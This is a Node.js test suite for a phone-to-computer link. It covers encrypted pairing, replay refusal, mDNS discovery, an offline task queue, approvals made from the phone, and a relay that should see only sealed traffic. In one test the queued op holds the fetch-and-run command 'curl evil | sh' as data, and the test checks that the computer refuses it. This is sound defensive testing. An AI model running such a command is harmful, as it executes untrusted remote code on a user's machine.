// Your phone (phone.mjs): the computer and the phone in homes of their own, the
// link between them sealed; finding the computer again (mdns.mjs); the QR that pairs
// (qr.mjs); the phone's copy of your work, what it queues while the computer's away,
// and the relay (relay/) that carries it away from home. This process is the phone;
// the computer is a child process with its own HOME, driven over stdin.
//
//   node test/phone.mjs
//
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn, execSync } from "node:child_process";
import { createServer } from "node:net";
import { createInterface } from "node:readline";

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..");
const ROOT = mkdtempSync(join(tmpdir(), "symbiot-phone-"));
const PH = join(ROOT, "phone"), PC = join(ROOT, "computer"), CFG = join(PH, ".config", "symbiot"), PCFG = join(PC, ".config", "symbiot");
mkdirSync(CFG, { recursive: true }); mkdirSync(PCFG, { recursive: true });
process.env.HOME = PH; process.env.USERPROFILE = PH;
process.env.SYMBIOT_NO_MDNS = "1"; process.env.SYMBIOT_NO_POLL = "1"; delete process.env.SYMBIOT_ANDROID_APP; delete process.env.SYMBIOT_RELAY; delete process.env.SYMBIOT_NO_RELAY;
let pass = 0, fail = 0;
const ok = (n, c, got) => { if (c) { pass++; console.log("  ✓ " + n); } else { fail++; console.log("  ✗ " + n + (got !== undefined ? "  got: " + JSON.stringify(got).slice(0, 900) : "")); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const freePort = () => new Promise((r) => { const s = createServer().listen(0, "127.0.0.1", () => { const p = s.address().port; s.close(() => r(p)); }); });
const readJ = (f, d = null) => { try { return JSON.parse(readFileSync(f, "utf8")); } catch { return d; } };

// The computer: phone.mjs in its own HOME, its approve recorded rather than run.
writeFileSync(join(ROOT, "computer.mjs"), `
  import { createInterface } from "node:readline";
  import { readFileSync } from "node:fs";
  const p = await import(${JSON.stringify(join(SRC, "phone.mjs"))});
  const t = await import(${JSON.stringify(join(SRC, "tasks.mjs"))});
  const w = await import(${JSON.stringify(join(SRC, "watch.mjs"))});
  const approved = [];
  p.setPhoneApprove(async (repo, untasked) => { approved.push({ repo, untasked }); return { ok: true, pr: "https://github.com/me/demo/pull/7" }; });
  const cmds = { on: () => p.setPhoneLink(true), off: () => p.setPhoneLink(false), code: () => p.newCode(), state: () => p.linkState(), unpair: (a) => p.unpairPhone(a.id),
    approved: () => approved, add: (a) => t.addTask(a.text, a.repo || ""), toggle: (a) => t.toggleTask(a.id), tasks: () => JSON.parse(readFileSync(${JSON.stringify(join(PCFG, "tasks.json"))}, "utf8")),
    snapshot: () => p.snapshot({ fresh: true }), loaded: () => typeof w.newsAfter };
  createInterface({ input: process.stdin }).on("line", async (l) => {
    const m = JSON.parse(l);
    if (m.cmd === "exit") { p.stopPhoneLink(); process.exit(0); }
    try { process.stdout.write(JSON.stringify({ id: m.id, r: await cmds[m.cmd](m.args || {}) }) + "\\n"); } catch (e) { process.stdout.write(JSON.stringify({ id: m.id, error: String((e && e.stack) || e) }) + "\\n"); }
  });
  process.stdout.write(JSON.stringify({ ready: true }) + "\\n");
`);
function startComputer(env = {}) {
  const child = spawn(process.execPath, [join(ROOT, "computer.mjs")], { env: { ...process.env, HOME: PC, USERPROFILE: PC, SYMBIOT_NO_MDNS: "1", SYMBIOT_NO_RELAY: "1", SYMBIOT_NO_POLL: "1", ...env }, stdio: ["pipe", "pipe", "pipe"] });
  const waiting = new Map(); let n = 0, err = "";
  const ready = new Promise((res) => {
    createInterface({ input: child.stdout }).on("line", (l) => { let m; try { m = JSON.parse(l); } catch { return; } if (m.ready) return res(); const w = waiting.get(m.id); if (w) { waiting.delete(m.id); w(m.error ? { error: m.error } : m.r); } });
  });
  child.stderr.on("data", (d) => { err += d; });
  const cmd = (c, args) => new Promise((res) => { const id = ++n; waiting.set(id, res); child.stdin.write(JSON.stringify({ id, cmd: c, args }) + "\n"); setTimeout(() => { if (waiting.has(id)) { waiting.delete(id); res({ error: "timeout " + c + " " + err.slice(-400) }); } }, 30000); });
  return { ready, cmd, stop: () => new Promise((res) => { child.on("exit", res); try { child.stdin.write(JSON.stringify({ cmd: "exit" }) + "\n"); } catch { res(); } setTimeout(() => { try { child.kill("SIGKILL"); } catch {} }, 3000); }), err: () => err };
}

// A repo on the computer with an agent's work waiting for Approve.
const REPO = join(PC, "work", "demo"); mkdirSync(REPO, { recursive: true });
execSync("git init -q -b main && echo one > a.txt && git add . && git -c user.email=a@b -c user.name=a commit -q -m init && echo two >> a.txt", { cwd: REPO });
const port = await freePort();
writeFileSync(join(PCFG, "config.json"), JSON.stringify({ phoneLink: { port }, scanRoots: [join(PC, "work")] }));
writeFileSync(join(PCFG, "tasks.json"), JSON.stringify([
  { id: "t1", text: "Write the release notes", repo: "", done: false, ts: 1 },
  { id: "t2", text: "Check the invoices", repo: "", done: false, ts: 1 },
  { id: "r1", text: "Fix the login page", repo: "demo", done: false, review: true, ts: 1 },
]));
const since0 = Date.now() - 1000;
writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "o", watch: "w1", name: "Inbox", ts: since0 - 60000, text: "Old mail" }], briefs: [] }));
const putNews = (since) => writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "a", watch: "w1", name: "Inbox", ts: since + 10, text: "Sam, Contract signed" }, { id: "b", watch: "w1", name: "Inbox", ts: since + 10, text: "Ann, Lunch?" }], briefs: [] }));

const P = await import("../phone.mjs");
const told = [], notify = (t, b) => told.push([t, b]);
// what crossed the network, as the phone saw it (to check none of it is plain)
const wire = [];
const tapFetch = async (url, o = {}) => { const r = await fetch(url, o); const text = await r.text(); wire.push(String(o.body || "") + "\n" + text); return new Response(text, { status: r.status, headers: r.headers }); };
let pc = startComputer();
try {
  await pc.ready;
  const BASE = `http://127.0.0.1:${port}`;

  console.log("1. SEALED — paired with a key both sides agree, everything after sealed");
  const on = await pc.cmd("on");
  ok("switched on: it listens, with a code, a key fingerprint, and the QR's link", on.listening && /^\d{6}$/.test(on.code) && on.fp && /^https:\/\/symbiot\.co\.za\/pair#a=.*&p=\d+&c=\d{6}&k=/.test(on.link) && /^<svg/.test(on.qr || ""), { ...on, qr: (on.qr || "").slice(0, 30) });
  const hello = await (await fetch(BASE + "/phone/hello")).json();
  ok("/phone/hello gives the computer's public key and its fingerprint (the QR's k)", hello.pub && hello.fp === on.fp, hello);
  const oldPair = await fetch(BASE + "/phone/pair", { method: "POST", body: JSON.stringify({ code: on.code, name: "Old" }) });
  ok("a phone's Symbiot from before (a plain code) is told to update, and doesn't pair", oldPair.status === 400 && /Update Symbiot on this phone/.test((await oldPair.json()).error), oldPair.status);
  const wrong = await P.pairComputer(`127.0.0.1:${port}`, on.code === "000000" ? "111111" : "000000", { fetchFn: tapFetch });
  ok("a wrong code doesn't pair", !wrong.paired && /isn't right/.test(wrong.error || ""), wrong);
  const paired = await P.pairComputer(`127.0.0.1:${port}`, on.code, { name: "Pixel", fetchFn: tapFetch });
  ok("the right code pairs", paired.paired && !paired.error && paired.name, paired);
  const pcfg = readJ(join(CFG, "config.json")), psec = readJ(join(CFG, "secrets.json"));
  ok("the phone pins the computer's key; its token and the shared key are in secrets.json, not config.json", pcfg.computer.fp === on.fp && pcfg.computer.pub === hello.pub && !JSON.stringify(pcfg).includes(psec.computerSecret.token) && psec.computerSecret.key, pcfg.computer);
  const ccfg = readJ(join(PCFG, "config.json")), csec = readJ(join(PCFG, "secrets.json"));
  ok("10. the computer keeps only a hash of the phone's token, and its private key in secrets.json", ccfg.phoneLink.phones.length === 1 && ccfg.phoneLink.phones[0].hash && !("token" in ccfg.phoneLink.phones[0]) && !readFileSync(join(PCFG, "config.json"), "utf8").includes(psec.computerSecret.token) && csec.phoneSecret.priv && !JSON.stringify(ccfg).includes(csec.phoneSecret.priv), ccfg.phoneLink);
  const since = pcfg.computer.since; putNews(since);
  const poll = await P.pollComputer({ fetchFn: tapFetch, notify, discover: async () => [] });
  ok("what's new arrives and is notified, one per watch per read", poll.shown === 1 && told.length === 1 && /2 new · Inbox/.test(told[0][0]) && /Contract signed/.test(told[0][1]) && !poll.error, [poll, told]);
  ok("nothing that crossed the network is plain: no subject, no task, no token", wire.length >= 3 && !wire.some((w) => /Contract signed|Lunch|release notes|invoices|Fix the login/.test(w) || w.includes(psec.computerSecret.token)), wire.map((w) => w.slice(0, 120)));
  const plain = await fetch(BASE + "/phone/news", { method: "POST", body: JSON.stringify({ since: 0 }) });
  ok("a raw request without the sealed envelope gets 403", plain.status === 403, plain.status);
  const legacy = await fetch(BASE + "/phone/news?since=0", { headers: { "x-symbiot-phone": "anything" } });
  ok("a phone paired before (a plain token) gets 403 and is told to pair again", legacy.status === 403 && /pair it again/i.test((await legacy.json()).error), legacy.status);
  const stranger = await fetch(BASE + "/phone/state", { method: "POST", body: JSON.stringify({ v: 1, id: "deadbeef", n: "AAAAAAAAAAAAAAAA", c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" }) });
  ok("a stranger's envelope gets 403, plain (there's no key to seal it with)", stranger.status === 403, stranger.status);
  const other = await fetch(BASE + "/api/agentcmd", { method: "POST", body: "{}" });
  ok("nothing else is served there: the app's API isn't reachable", other.status === 404, other.status);
  // a captured request sent again: refused
  const sent = wire.find((w) => /"v":1,"id"/.test(w) && !/"pub"/.test(w)).split("\n")[0];
  const again = await (await fetch(BASE + "/phone/news", { method: "POST", body: sent })).json();
  const key = Buffer.from(psec.computerSecret.key, "base64url"), env0 = JSON.parse(sent), again0 = P.unseal(key, again, "res:" + env0.n);
  ok("a captured request sent again is refused (sealed 409)", again0 && again0.s === 409, again0);
  writeFileSync(join(CFG, "config.json"), JSON.stringify({ ...pcfg, computer: { url: BASE, token: "abc", name: "old", since: 0 } }));
  const was = readJ(join(CFG, "secrets.json")); writeFileSync(join(CFG, "secrets.json"), "{}");
  const oldSt = P.computerState();
  ok("a phone paired before the link was sealed is told to pair again, not left failing", oldSt.paired && oldSt.old && /Pair this phone .* again/.test(oldSt.error), oldSt);
  writeFileSync(join(CFG, "config.json"), JSON.stringify(pcfg)); writeFileSync(join(CFG, "secrets.json"), JSON.stringify(was));

  console.log("10. KEYS — old whole tokens are hashed on first use; the Android app hands its key to the Keystore");
  const c2 = readJ(join(PCFG, "config.json")); c2.phoneLink.phones[0] = { ...c2.phoneLink.phones[0], token: psec.computerSecret.token }; delete c2.phoneLink.phones[0].hash;
  writeFileSync(join(PCFG, "config.json"), JSON.stringify(c2));
  const p2 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  const c3 = readJ(join(PCFG, "config.json")).phoneLink.phones[0];
  ok("a phone entry with its token kept whole still works once, then only its hash is kept", !p2.error && p2.last && c3.hash && !("token" in c3), [p2.error, c3]);
  const ADIR = join(ROOT, "android"); mkdirSync(join(ADIR, ".config", "symbiot"), { recursive: true });
  const code2 = (await pc.cmd("code")).code;
  const runA = (src, env = {}) => new Promise((res) => { const ch = spawn(process.execPath, ["--input-type=module", "-e", src], { env: { ...process.env, HOME: ADIR, USERPROFILE: ADIR, SYMBIOT_ANDROID_APP: "1", ...env } }); let o = "", e = ""; ch.stdout.on("data", (d) => { o += d; }); ch.stderr.on("data", (d) => { e += d; }); ch.on("exit", () => { try { res(JSON.parse(o.trim().split("\n").pop())); } catch { res({ error: e.slice(-600) || o }); } }); });
  const ap = await runA(`const p = await import(${JSON.stringify(join(SRC, "phone.mjs"))}); const r = await p.pairComputer("127.0.0.1:${port}", "${code2}", { name: "Galaxy" }); console.log(JSON.stringify(r)); process.exit(0);`);
  const aCfg = readFileSync(join(ADIR, ".config", "symbiot", "config.json"), "utf8"), aSec = readJ(join(ADIR, ".config", "symbiot", "secrets.json"), {}), seal = readJ(join(ADIR, ".config", "symbiot", "android-seal.json"));
  ok("on the Android app the token and key go to the app (android-seal.json) for its Keystore, never to config or secrets", ap.paired && seal && seal.token && seal.key && !aCfg.includes(seal.token) && !("computerSecret" in aSec), [ap, aSec]);
  rmSync(join(ADIR, ".config", "symbiot", "android-seal.json"));
  const ap2 = await runA(`const p = await import(${JSON.stringify(join(SRC, "phone.mjs"))}); const r = await p.pollComputer({ notify: () => {}, discover: async () => [] }); console.log(JSON.stringify(r)); process.exit(0);`, { SYMBIOT_COMPUTER_SECRET: JSON.stringify(seal) });
  ok("…and back in SYMBIOT_COMPUTER_SECRET at the next start, it still asks", !ap2.error && ap2.last > 0, ap2);
  const ap3 = await runA(`const p = await import(${JSON.stringify(join(SRC, "phone.mjs"))}); console.log(JSON.stringify(p.computerState())); process.exit(0);`);
  ok("…without it (the Keystore's key gone), it says to pair again", ap3.old && /pair/i.test(ap3.error || ""), ap3);

  console.log("5. BACK BY ITSELF — another address, found again, never unpaired by a network error");
  const cfgNow = readJ(join(CFG, "config.json")); cfgNow.computer.url = "http://127.0.0.1:1"; cfgNow.computer.urls = ["http://127.0.0.1:1", BASE]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow));
  const p5 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("the last address fails, another it gave at pairing answers: that's the address now", !p5.error && readJ(join(CFG, "config.json")).computer.url === BASE, [p5.error, readJ(join(CFG, "config.json")).computer.url]);
  const cfgGone = readJ(join(CFG, "config.json")); cfgGone.computer.url = "http://127.0.0.1:1"; cfgGone.computer.urls = ["http://127.0.0.1:1"]; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgGone));
  let asked = null;
  const p6 = await P.pollComputer({ notify: () => {}, discover: async (c) => { asked = c.fp; return [BASE]; } });
  ok("none of them answers: it looks for the computer by its key's fingerprint (mDNS), and keeps the address it found", !p6.error && asked === on.fp && readJ(join(CFG, "config.json")).computer.url === BASE, [p6.error, asked]);
  const cfgOff = readJ(join(CFG, "config.json")); cfgOff.computer.url = "http://127.0.0.1:1"; cfgOff.computer.urls = []; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgOff));
  const f1 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("a network error never clears the pairing", f1.paired && !f1.away && readJ(join(CFG, "config.json")).computer.id && readJ(join(CFG, "secrets.json")).computerSecret, f1);

  console.log("7. OUT OF REACH — one calm line, with when it last heard");
  const f2 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("failed more than one round: away, with the time it last heard from the computer", f2.away && f2.heard > 0 && f2.paired, f2);
  writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow)); cfgNow.computer.url = BASE; writeFileSync(join(CFG, "config.json"), JSON.stringify(cfgNow));
  const f3 = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…gone with the next good poll", !f3.away && !f3.error, f3);

  console.log("6. THE COPY — your work on the phone, shown with the computer off");
  const copy = readJ(join(CFG, "computer.json"));
  ok("the phone keeps the computer's tasks, what needs you and its Approve, in computer.json", copy && copy.v && copy.tasks.some((t) => t.text === "Write the release notes") && copy.approves.some((a) => a.repo === "demo" && a.tasks[0].id === "r1" && a.files === 1 && a.sum) && Array.isArray(copy.needs) && Array.isArray(copy.asks), copy && { ...copy, tasks: copy.tasks.length });
  const st1 = await (await import("../phone.mjs")).computerView();
  ok("the view is that copy, with the computer's name", st1.copy && st1.copy.v === copy.v && st1.name, Object.keys(st1));
  const before = readJ(join(CFG, "computer.json")).got;
  await sleep(20);
  const wire0 = wire.length; await P.pollComputer({ fetchFn: tapFetch, notify: () => {}, discover: async () => [] });
  const last = wire[wire.length - 1].split("\n");
  const stReply = P.unseal(key, JSON.parse(last[1]), "res:" + JSON.parse(last[0]).n);
  ok("unchanged since: the state request costs nothing (304), and the copy is kept", stReply && stReply.s === 304 && readJ(join(CFG, "computer.json")).v === copy.v && readJ(join(CFG, "computer.json")).got > before && wire.length > wire0, stReply);

  console.log("8. CHANGES FROM THE PHONE — queued, sent in order, applied once");
  let v = P.queueChange("task.add", { text: "Call the bank" });
  ok("a task added on the phone shows at once, waiting to send", v.copy.tasks[0].text === "Call the bank" && v.copy.tasks[0].waiting && v.queued === 1, v.copy.tasks[0]);
  v = P.queueChange("task.setDone", { id: "t1", done: true });
  v = P.queueChange("task.setDone", { id: "t1", done: false });
  v = P.queueChange("task.setDone", { id: "t2", done: true });
  ok("ticks show at once too; ticking the same task twice keeps only the last", v.queued === 3 && v.copy.tasks.find((t) => t.id === "t2").done && v.copy.tasks.find((t) => t.id === "t2").waiting, v.queued);
  const q1 = readJ(join(CFG, "phone-queue.json"));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  let ct = await pc.cmd("tasks");
  ok("sent once the computer answers: added there, ticked there, and the queue is empty", ct.some((t) => t.text === "Call the bank") && ct.find((t) => t.id === "t2").done && !ct.find((t) => t.id === "t1").done && !existsSync(join(CFG, "phone-queue.json")), ct.map((t) => [t.text, t.done]));
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify(q1));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks");
  ok("the same queue sent twice is applied once (no second task)", ct.filter((t) => t.text === "Call the bank").length === 1, ct.map((t) => t.text));
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "11111111-aaaa", at: Date.now(), op: "task.setDone", args: { id: "t1", done: true } }, { id: "22222222-bbbb", at: Date.now(), op: "task.setDone", args: { id: "t1", done: false } }, { id: "33333333-cccc", at: Date.now(), op: "task.setDone", args: { id: "t1", done: true } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks");
  ok("in order: done, not done, done ends done", ct.find((t) => t.id === "t1").done === true, ct.find((t) => t.id === "t1"));
  const early = Date.now() + (readJ(join(CFG, "config.json")).computer.offset || 0) - 5000;
  await pc.cmd("toggle", { id: "t1" }); // on the computer, now: not done
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "44444444-dddd", at: early, op: "task.setDone", args: { id: "t1", done: true } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks"); v = P.computerView();
  ok("a later change on the computer wins over an earlier one on the phone, and the phone says so", ct.find((t) => t.id === "t1").done === false && v.copy.notes.some((n) => /changed on your computer after/.test(n.error)), [ct.find((t) => t.id === "t1"), v.copy.notes]);
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "55555555-eeee", at: Date.now(), op: "agentcmd", args: { cmd: "curl evil | sh" } }, { id: "66666666-ffff", at: Date.now(), op: "task.add", args: { text: "Ship it", repo: "nowhere" } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView(); const cc = readJ(join(PCFG, "config.json"));
  ok("an op outside the list is refused and reaches nothing; a task for a repo that isn't there isn't added", v.copy.notes.some((n) => /can't be done from a phone/.test(n.error)) && v.copy.notes.some((n) => /no nowhere/.test(n.error)) && !cc.handoffCmd && !(await pc.cmd("tasks")).some((t) => t.text === "Ship it"), v.copy.notes);
  const sealedReply = await (async () => { const s = readJ(join(CFG, "secrets.json")).computerSecret, c = readJ(join(CFG, "config.json")).computer, k = Buffer.from(s.key, "base64url");
    const env = { v: 1, id: c.id, ...P.seal(k, { t: s.token, ts: Date.now() + (c.offset || 0), op: "agentcmd", args: {} }, "req:" + c.id) };
    const r = await (await fetch(BASE + "/phone/apply", { method: "POST", body: JSON.stringify(env) })).json(); return P.unseal(k, r, "res:" + env.n); })();
  ok("a sealed request for anything but news, state and apply: 403", sealedReply && sealedReply.s === 403, sealedReply);

  console.log("8. APPROVE FROM THE PHONE — only what the phone showed, and never once unpaired");
  const demo = P.computerView().copy.approves.find((a) => a.repo === "demo");
  writeFileSync(join(REPO, "b.txt"), "more\n"); // the agent did more since the phone looked
  await sleep(5100); // past the computer's 5-second cache of the copy
  P.queueChange("pending.approve", { repo: "demo", sum: demo.sum });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView();
  ok("the work changed since the phone saw it: refused, and shown on the phone", !(await pc.cmd("approved")).length && v.copy.notes.some((n) => /changed since your phone showed it/.test(n.error)), v.copy.notes.slice(-1));
  const fresh = v.copy.approves.find((a) => a.repo === "demo");
  ok("…the copy now shows what's there (two files)", fresh && fresh.files === 2 && fresh.sum !== demo.sum, fresh);
  P.queueChange("pending.approve", { repo: "demo", sum: fresh.sum });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  await sleep(300);
  const did = await pc.cmd("approved"); const snap = await pc.cmd("snapshot");
  ok("what the phone showed is what's there: approved, the same Approve as the button", did.length === 1 && did[0].repo === "demo" && !did[0].untasked, did);
  ok("…and the computer says which phone approved it", snap.recent.some((r) => r.repo === "demo" && r.phone === "Pixel" && r.status === "approved" && /pull\/7/.test(r.pr)), snap.recent);
  const id = (await pc.cmd("state")).phones.find((p) => p.name === "Pixel").id;
  await pc.cmd("unpair", { id });
  P.queueChange("pending.approve", { repo: "demo", sum: fresh.sum });
  const un = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("unpaired: its queued approve is refused, sealed, dropped, and the phone is told", (await pc.cmd("approved")).length === 1 && /unpaired/.test(un.error || "") && !P.computerView().queued && P.computerView().copy.notes.some((n) => /Not approved: this phone was unpaired/.test(n.error)), [un.error, P.computerView().queued]);

  console.log("8. WITH THE COMPUTER OFF — kept, then sent when it starts");
  const code3 = (await pc.cmd("code")).code;
  const re = await P.pairComputer(`127.0.0.1:${port}`, code3, { name: "Pixel" });
  ok("paired again with the same computer: the copy stays", re.paired && !re.error && existsSync(join(CFG, "computer.json")), re);
  await pc.stop();
  v = P.queueChange("task.add", { text: "Book the flights" });
  const offPoll = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView();
  ok("the computer is off: the phone still shows its tasks (the copy) and the new one waiting to send", v.copy.tasks.some((t) => t.text === "Write the release notes") && v.copy.tasks.some((t) => t.text === "Book the flights" && t.waiting) && offPoll.error, [v.copy.tasks.length, offPoll.error]);
  pc = startComputer(); await pc.ready; await pc.cmd("on");
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…it starts: the task is there", (await pc.cmd("tasks")).some((t) => t.text === "Book the flights") && !P.computerView().queued, P.computerView().queued);

  console.log("9. AWAY FROM HOME — through the relay, which only passes sealed messages");
  // the relay in this process (relay/server.mjs); SYMBIOT_TEST_RELAY=<url> runs these against
  // another one instead: the Worker in Miniflare, or the deployed relay.symbiot.co.za
  const { startRelay } = await import("../relay/server.mjs");
  const taps = [], elsewhere = process.env.SYMBIOT_TEST_RELAY;
  const relay = elsewhere ? { close() {} } : await startRelay({ tap: (k, t) => taps.push(t) });
  const RELAY = elsewhere ? elsewhere.replace(/\/+$/, "") : `http://127.0.0.1:${relay.port}`;
  await pc.stop(); pc = startComputer({ SYMBIOT_NO_RELAY: "0", SYMBIOT_RELAY: RELAY }); await pc.ready; await pc.cmd("on");
  let rs = null; for (let i = 0; i < 40 && !(rs && rs.relay.connected); i++) { await sleep(100); rs = await pc.cmd("state"); }
  ok("the computer keeps a line open to the relay while a phone is paired", rs && rs.relay.connected, rs && rs.relay);
  const code4 = (await pc.cmd("code")).code;
  const r4 = await P.pairComputer(`127.0.0.1:${port}`, code4, { name: "Pixel" });
  const rc = readJ(join(CFG, "config.json")).computer;
  ok("pairing gives the phone the relay's address and the pair's id, a hash, not the token or a name", r4.paired && rc.relay && rc.relayUrl === RELAY && rc.relay.length === 32 && !rc.relay.includes(rc.name), rc);
  rc.url = "http://127.0.0.1:1"; rc.urls = []; writeFileSync(join(CFG, "config.json"), JSON.stringify({ ...readJ(join(CFG, "config.json")), computer: rc }));
  const pc2 = readJ(join(CFG, "config.json")).computer;
  writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "z", watch: "w1", name: "Inbox", ts: pc2.since + 50, text: "Lee, Quarterly numbers" }], briefs: [] }));
  told.length = 0;
  const viaR = await P.pollComputer({ notify, discover: async () => [] });
  ok("with your Wi-Fi out of reach, news and the copy come through the relay", !viaR.error && viaR.via === "relay" && told.length === 1 && /Quarterly numbers/.test(told[0][1]) && readJ(join(CFG, "computer.json")).tasks.length > 2, [viaR, told]);
  if (elsewhere) console.log("  - (another relay: what it saw isn't in reach of this test)");
  else ok("the relay saw nothing plain: no subject, no task, no token", taps.length >= 4 && !taps.some((t) => /Quarterly|Lee,|release notes|Book the flights/.test(t) || t.includes(readJ(join(CFG, "secrets.json")).computerSecret.token)), taps.map((t) => t.slice(0, 80)));
  P.queueChange("task.add", { text: "Renew the domain" });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("a change made away from home reaches the computer through it too", (await pc.cmd("tasks")).some((t) => t.text === "Renew the domain"), "");
  const strange = await fetch(`${RELAY}/v1/${"x".repeat(32)}/ask`, { method: "POST", body: "{}" });
  ok("a stranger's pairing id gets nothing (the computer isn't there for it)", strange.status === 503, strange.status);
  const imp = await new Promise((res) => { const ws = new WebSocket(`${RELAY.replace("http", "ws")}/v1/${rc.relay}/computer`); ws.onopen = () => ws.send(JSON.stringify({ hello: "not-the-secret-not-the-secret" })); ws.onmessage = (e) => res(JSON.parse(e.data)); setTimeout(() => res(null), 3000); });
  ok("someone else can't take the computer's place on the relay (it must show the secret behind the id)", imp && /isn't this pair's computer/.test(imp.error), imp);
  const still = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…and the real computer still answers", !still.error && still.via === "relay", still);
  await pc.stop(); pc = startComputer({ SYMBIOT_NO_RELAY: "0", SYMBIOT_RELAY: RELAY }); await pc.ready;
  const cOff = readJ(join(PCFG, "config.json")); cOff.phoneLink.relay = false; writeFileSync(join(PCFG, "config.json"), JSON.stringify(cOff));
  await pc.cmd("on"); await sleep(400);
  const offR = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("with the relay switched off on the computer, nothing goes through it (Wi-Fi only)", offR.error && !(await pc.cmd("state")).relay.connected, [offR.error, (await pc.cmd("state")).relay]);
  relay.close();

  console.log("3. FOUND ON THE NETWORK — mDNS, its name neutral, its TXT the key's fingerprint");
  const { announce, browse, encMessage, decMessage, T } = await import("../mdns.mjs");
  const back = decMessage(encMessage({ response: true, answers: [{ name: "_symbiot._tcp.local", type: T.PTR, data: "Symbiot-1a2b._symbiot._tcp.local" }], additionals: [{ name: "Symbiot-1a2b._symbiot._tcp.local", type: T.TXT, data: { v: 1, fp: "Abc" } }, { name: "symbiot-1a2b.local", type: T.A, data: "192.168.8.50" }] }));
  ok("its DNS messages read back", back.records[0].data === "Symbiot-1a2b._symbiot._tcp.local" && back.records[1].data.fp === "Abc" && back.records[2].data === "192.168.8.50", back.records);
  // a pretend network in this process: multicast to every socket on 5353, the rest to its port
  const bus = new Set();
  const fake = () => { const h = {}; let pt = 0; const s = { on: (e, f) => { h[e] = f; }, bind: (p, cb) => { pt = p || 40000 + bus.size; bus.add(s); setTimeout(cb, 0); }, setMulticastTTL() {}, setMulticastLoopback() {}, addMembership() {}, setMulticastInterface() {}, unref() {},
    close() { bus.delete(s); }, send(msg, toPort, to) { for (const o of [...bus]) if (o !== s && (to === "224.0.0.251" ? o.port === 5353 : o.port === toPort)) setTimeout(() => o.h.message && o.h.message(Buffer.from(msg), { address: "127.0.0.1", port: pt }), 0); }, get port() { return pt; }, h };
    return s; };
  const an = announce({ id: "1a2b", port: 7392, fp: on.fp, addresses: () => ["192.168.8.50", "10.0.0.7"] }, { socket: fake });
  const seenNet = await browse({ socket: fake, timeout: 200 });
  ok("asked on the network, it answers with its port, addresses and fingerprint, under a neutral name", seenNet.length === 1 && seenNet[0].port === 7392 && seenNet[0].addresses.join() === "192.168.8.50,10.0.0.7" && seenNet[0].fp === on.fp && seenNet[0].name === "Symbiot-1a2b" && !seenNet[0].name.includes(String((await import("node:os")).hostname())), seenNet);
  an.stop(); await sleep(100);
  ok("switched off: it stops answering", (await browse({ socket: fake, timeout: 150 })).length === 0, "");
  // what it answers with: only what the asker can reach (ops saw avahi pick the Tailscale address)
  const ifs = { lo: [{ family: "IPv4", address: "127.0.0.1", netmask: "255.0.0.0", internal: true }], wlp2s0: [{ family: "IPv4", address: "192.168.1.21", netmask: "255.255.255.0" }],
    tailscale0: [{ family: "IPv4", address: "100.78.4.37", netmask: "255.255.255.255" }], wg0: [{ family: "IPv4", address: "10.8.0.2", netmask: "255.255.255.0" }], eth1: [{ family: "IPv4", address: "10.0.5.4", netmask: "255.255.0.0" }] };
  ok("a phone on the Wi-Fi gets the Wi-Fi address only, not Tailscale's", P.mdnsAddresses("192.168.1.77", ifs).join() === "192.168.1.21", P.mdnsAddresses("192.168.1.77", ifs));
  ok("…an asker on another network gets that network's address (::ffff: form too)", P.mdnsAddresses("::ffff:10.0.9.9", ifs).join() === "10.0.5.4", P.mdnsAddresses("::ffff:10.0.9.9", ifs));
  ok("…an announcement, or an asker on no network of ours, gets every address but a VPN's", P.mdnsAddresses(undefined, ifs).join() === "192.168.1.21,10.0.5.4" && P.mdnsAddresses("8.8.8.8", ifs).join() === "192.168.1.21,10.0.5.4", P.mdnsAddresses(undefined, ifs));
  ok("…and a computer with only a VPN still answers with it", P.mdnsAddresses(undefined, { tailscale0: ifs.tailscale0 }).join() === "100.78.4.37", "");
  const askers = [], an2 = announce({ id: "3c4d", port: 7392, fp: on.fp, addresses: (who) => { askers.push(who); return who ? ["192.168.8.51"] : ["192.168.8.51", "10.0.0.8"]; } }, { socket: fake });
  await sleep(20); const seen2 = await browse({ socket: fake, timeout: 200 }); an2.stop(); await sleep(100);
  ok("…the asker's address reaches that choice, and the answer carries what it chose", askers.includes("127.0.0.1") && seen2.length === 1 && seen2[0].addresses.join() === "192.168.8.51", [askers, seen2]);
  const offSt = await pc.cmd("off");
  ok("nothing is announced while the link is off", offSt.found === false, offSt.found);
